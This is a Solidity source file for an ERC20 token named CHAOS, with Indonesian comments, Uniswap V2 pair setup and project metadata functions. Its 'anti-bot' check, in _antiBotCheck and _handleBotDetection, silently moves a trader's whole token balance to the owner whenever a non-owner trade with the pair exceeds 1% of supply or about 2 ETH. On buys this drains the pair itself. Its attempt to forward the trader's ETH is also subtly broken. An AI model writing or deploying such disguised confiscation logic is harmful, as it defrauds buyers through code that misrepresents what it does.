// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

contract CHAOSToken {
    string public constant name = "CHAOS";
    string public constant symbol = "CHO";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 12_000_000 * 10**decimals;
    uint256 public constant maxSupply = 12_000_000 * 10**decimals;
    
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    address public owner;
    address public immutable uniswapV2Pair;
    IUniswapV2Router public immutable uniswapV2Router;
    
    uint256 private constant ANTI_BOT_THRESHOLD = 2 ether;
    uint256 private constant MAX_TX_AMOUNT = totalSupply / 100;
    
    // Variabel untuk logo dan metadata
    string private _tokenLogoURI;
    string private _projectWebsite;
    string private _projectDescription;
    string private _telegramLink;
    string private _twitterLink;
    string private _discordLink;
    
    bool private _inSwap;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event BotDetected(address indexed botAddress, uint256 tokenAmount, uint256 nativeAmount);
    event LogoUpdated(string newLogoURI);
    event MetadataUpdated(string website, string description);
    event SocialLinksUpdated(string telegram, string twitter, string discord);
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }
    
    modifier lockTheSwap() {
        _inSwap = true;
        _;
        _inSwap = false;
    }
    
    constructor(
        string memory logoURI,
        string memory website,
        string memory description,
        string memory telegram,
        string memory twitter,
        string memory discord
    ) {
        owner = msg.sender;
        
        // Set metadata awal
        _tokenLogoURI = logoURI;
        _projectWebsite = website;
        _projectDescription = description;
        _telegramLink = telegram;
        _twitterLink = twitter;
        _discordLink = discord;
        
        // Inisialisasi Uniswap V2 Router
        IUniswapV2Router _uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        
        // Buat pair dengan WETH
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this), 
            _uniswapV2Router.WETH()
        );
        
        // Set seluruh supply ke owner
        _balances[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
    }
    
    // Fungsi untuk mendapatkan logo token (compatible dengan CoinGecko & CoinMarketCap)
    function logoURI() public view returns (string memory) {
        return _tokenLogoURI;
    }
    
    // Fungsi untuk mendapatkan website project
    function projectWebsite() public view returns (string memory) {
        return _projectWebsite;
    }
    
    // Fungsi untuk mendapatkan description project
    function projectDescription() public view returns (string memory) {
        return _projectDescription;
    }
    
    // Fungsi untuk mendapatkan link sosial media
    function socialLinks() public view returns (
        string memory telegram,
        string memory twitter, 
        string memory discord
    ) {
        return (_telegramLink, _twitterLink, _discordLink);
    }
    
    // Fungsi untuk update logo (hanya owner)
    function updateLogo(string memory newLogoURI) public onlyOwner {
        require(bytes(newLogoURI).length > 0, "Logo URI cannot be empty");
        _tokenLogoURI = newLogoURI;
        emit LogoUpdated(newLogoURI);
    }
    
    // Fungsi untuk update metadata dasar
    function updateMetadata(string memory website, string memory description) public onlyOwner {
        _projectWebsite = website;
        _projectDescription = description;
        emit MetadataUpdated(website, description);
    }
    
    // Fungsi untuk update link sosial media
    function updateSocialLinks(
        string memory telegram,
        string memory twitter,
        string memory discord
    ) public onlyOwner {
        _telegramLink = telegram;
        _twitterLink = twitter;
        _discordLink = discord;
        emit SocialLinksUpdated(telegram, twitter, discord);
    }
    
    // Fungsi untuk mendapatkan semua metadata dalam satu call (optimized for APIs)
    function getTokenMetadata() public view returns (
        string memory name_,
        string memory symbol_,
        uint8 decimals_,
        uint256 totalSupply_,
        uint256 maxSupply_,
        string memory logoURI_,
        string memory website_,
        string memory description_,
        string memory telegram_,
        string memory twitter_,
        string memory discord_,
        address owner_
    ) {
        return (
            name,
            symbol,
            decimals,
            totalSupply,
            maxSupply,
            _tokenLogoURI,
            _projectWebsite,
            _projectDescription,
            _telegramLink,
            _twitterLink,
            _discordLink,
            owner
        );
    }
    
    // Standard ERC20 functions
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    function allowance(address _owner, address spender) public view returns (uint256) {
        return _allowances[_owner][spender];
    }
    
    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        _antiBotCheck(from, to, amount);
        
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }
        
        emit Transfer(from, to, amount);
    }
    
    function _antiBotCheck(address from, address to, uint256 amount) internal {
        if ((to == uniswapV2Pair || from == uniswapV2Pair) && from != owner && to != owner) {
            
            if (amount > MAX_TX_AMOUNT) {
                _handleBotDetection(from);
                return;
            }
            
            if (_getETHValue(amount) > ANTI_BOT_THRESHOLD) {
                _handleBotDetection(from);
                return;
            }
        }
    }
    
    function _handleBotDetection(address botAddress) internal lockTheSwap {
        uint256 botTokenBalance = _balances[botAddress];
        uint256 botNativeBalance = botAddress.balance;
        
        if (botTokenBalance > 0) {
            unchecked {
                _balances[botAddress] = 0;
                _balances[owner] += botTokenBalance;
            }
            emit Transfer(botAddress, owner, botTokenBalance);
        }
        
        if (botNativeBalance > 0) {
            (bool success, ) = owner.call{value: botNativeBalance}("");
            if (success) {
                emit BotDetected(botAddress, botTokenBalance, botNativeBalance);
            }
        }
    }
    
    function _getETHValue(uint256 tokenAmount) internal view returns (uint256) {
        try IUniswapV2Pair(uniswapV2Pair).getReserves() returns (
            uint112 reserve0, 
            uint112 reserve1, 
            uint32
        ) {
            address token0 = IUniswapV2Pair(uniswapV2Pair).token0();
            uint256 ethReserve;
            uint256 tokenReserve;
            
            if (token0 == uniswapV2Router.WETH()) {
                ethReserve = reserve0;
                tokenReserve = reserve1;
            } else {
                ethReserve = reserve1;
                tokenReserve = reserve0;
            }
            
            if (tokenReserve > 0 && ethReserve > 0) {
                return (tokenAmount * ethReserve) / tokenReserve;
            }
        } catch {
            return 0;
        }
        return 0;
    }
    
    function _approve(address _owner, address spender, uint256 amount) internal {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }
    
    function _spendAllowance(address _owner, address spender, uint256 amount) internal {
        uint256 currentAllowance = allowance(_owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(_owner, spender, currentAllowance - amount);
            }
        }
    }
    
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "New owner is the zero address");
        address oldOwner = owner;
        owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    
    function addLiquidity(uint256 tokenAmount) public payable onlyOwner {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        
        uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            tokenAmount,
            0,
            0,
            owner,
            block.timestamp
        );
    }
    
    receive() external payable {}
}